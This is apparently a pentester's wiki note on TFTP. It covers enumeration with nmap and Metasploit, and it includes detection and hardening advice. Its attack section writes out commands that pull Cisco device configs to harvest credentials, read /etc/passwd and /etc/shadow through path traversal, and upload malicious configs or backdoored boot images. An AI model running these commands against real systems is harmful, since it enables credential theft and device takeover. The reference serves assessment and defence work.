# TFTP

#TFTP #TrivialFileTransferProtocol #filetransfer

## What is TFTP?

Trivial File Transfer Protocol — a stripped-down, **unauthenticated, unencrypted** file transfer over **UDP 69**. No login, no directory listing, no path negotiation: you transfer a file only by knowing its exact name. It survives because network gear leans on it — PXE network boot, router/switch firmware and **config** transfer, IP-phone provisioning. On an engagement it's a quiet source of **device configs full of credentials**, and, when writable, a way to plant a malicious config or boot file.

- Port **UDP 69** — TFTP (UDP only; no connection, so scans are less reliable)
- No auth, no listing — you must know or guess the filename
- Served by: routers, switches, IP phones, PXE/provisioning servers

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Scanning/NMAP\|NMAP]] | `tftp-enum` NSE + UDP service detection (`-sU`) |
| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `auxiliary/scanner/tftp/tftpbrute` (filename brute), `tftp` server module |

The native client is `tftp` (from `tftp-hpa`), used inline below.

---

## Enumeration

```bash
# UDP service detection + filename enumeration
nmap -sU -p 69 -sV <target>
nmap -sU -p 69 --script tftp-enum <target>

# Brute common filenames from a list
nmap -sU -p 69 --script tftp-enum --script-args tftp-enum.filelist=filenames.txt <target>

# Metasploit filename brute
use auxiliary/scanner/tftp/tftpbrute
```

### Common filenames to request

```
/etc/passwd  /etc/shadow          # if the server maps to a real FS / path traversal
running-config  startup-config    # Cisco/network device configs
cisco-confg  network-confg  router-confg  pix-confg
pxelinux.0   pxelinux.cfg/default # PXE boot image + options
```

---

## Connect / Access

```bash
# One-liner download / upload
tftp -g -r startup-config <target>          # get remote → local
tftp -p -l local.cfg -r startup-config <target>   # put local → remote

# Interactive session
tftp <target>
tftp> get running-config
tftp> put malicious.cfg
tftp> mode octet        # binary (firmware/images)
```

| Command | Description |
|---|---|
| `connect <host> [port]` | Set remote host/port |
| `get <remote> [local]` | Download |
| `put <local> [remote]` | Upload |
| `mode [ascii\|octet]` | Transfer mode (octet = binary) |
| `status` / `verbose` / `trace` | Session info / debugging |
| `quit` | Exit |

---

## Attack Vectors

### Pull network-device configs (the main prize)

```bash
tftp -g -r startup-config <target>
tftp -g -r running-config <target>
```

Cisco configs carry credentials: **Type-7** is trivially reversible (`ciscot7.py`, online decoders), **Type-5** (`$1$…` MD5-crypt) and **Type-8/9** are crackable with hashcat. SNMP community strings, VPN keys and enable secrets live here too. Full workflow: [[Techniques/Network Device Pentesting|Network Device Pentesting]].

### Path traversal → arbitrary file read

```bash
# Some TFTP servers don't confine to their root
tftp -g -r ../../../../etc/passwd <target>
tftp -g -r /etc/passwd <target>
```

### Upload malicious config / boot file (writable server)

```bash
# Replace a device config or plant a backdoored image
tftp -p -l malicious.cfg -r startup-config <target>
```

### PXE boot abuse

```bash
# Pull the boot chain — pxelinux.cfg often leaks hostnames, kickstart URLs, and creds
tftp -g -r pxelinux.0 <target>
tftp -g -r pxelinux.cfg/default <target>
```

---

## Detection & Artefacts

- **TFTP has no session or auth**, so the server log (if any) records only source IP + filename per RRQ/WRQ — a read of `startup-config` or a write of a boot file from an unexpected host is the tell.
- **UDP + no connection** means requests are easy to spoof and easy to miss; NetFlow to UDP/69 from non-management hosts is the network-level signal.
- **A changed config/boot file** on the device is the impact artefact — integrity-check firmware/config against a known-good baseline.
- Defensive baseline: restrict TFTP to the management VLAN/ACL, make it read-only, never expose it to untrusted networks, and prefer SCP/SFTP for device transfers where the platform supports it.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| World-readable server directory | Anyone can download any served file |
| Writable server directory | Anyone can upload/replace configs or boot images |
| No firewall/ACL restriction | Reachable from untrusted networks |
| Sensitive configs served (passwords, keys) | Credential exposure (Cisco Type-7/5, SNMP, VPN) |
| Path traversal not blocked | Arbitrary filesystem read |

---

## Quick Reference

| Goal | Command |
|---|---|
| UDP enum | `nmap -sU -p 69 --script tftp-enum host` |
| Download | `tftp -g -r <file> host` |
| Upload | `tftp -p -l local -r remote host` |
| Device config | `tftp -g -r running-config host` |
| Traversal read | `tftp -g -r ../../../../etc/passwd host` |
| Interactive | `tftp host` → `get <file>` |

---

> [!note] **See also** — [[Techniques/Network Device Pentesting|Network Device Pentesting]] (Cisco config looting, Type-7/5 cracking); [[Services/Network management/SNMP|SNMP]] — a RW community pushes a device's running-config to your TFTP server (Cisco config-copy); file-transfer siblings [[Services/File Xfer/FTP|FTP]] and [[Services/File Xfer/SFTP|SFTP]]. Cisco ASA running-config exfil via SNMP config-copy lands here too — see [[Services/Remote Access/Cisco AnyConnect|Cisco AnyConnect]].

---

*Created: 2026-07-13*
*Updated: 2026-09-23*
*Model: claude-opus-4-8*
